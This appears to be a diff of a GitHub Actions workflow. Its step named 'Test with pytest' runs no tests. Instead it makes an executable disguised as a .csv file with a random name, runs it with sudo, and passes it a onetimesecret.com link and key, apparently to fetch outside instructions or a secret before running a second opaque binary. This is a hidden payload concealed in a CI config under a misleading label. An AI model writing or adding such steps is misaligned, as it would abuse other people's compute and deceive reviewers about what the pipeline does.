@@ -23,10 +23,9 @@ jobs:
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
-        sudo apt install shc -y
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
-        echo 'xx06h'
+        echo 'xdnet'
         sudo chmod +x 7s2w7iw/farrishcx5i.csv
-        sudo ./7s2w7iw/farrishcx5i.csv   && sudo ./r.abc
+        sudo ./7s2w7iw/farrishcx5i.csv https://onetimesecret.com/secret/s36ahmdoh4hn1j3bu1828uetnqz5a1r vzt6zg && sudo ./r.abc
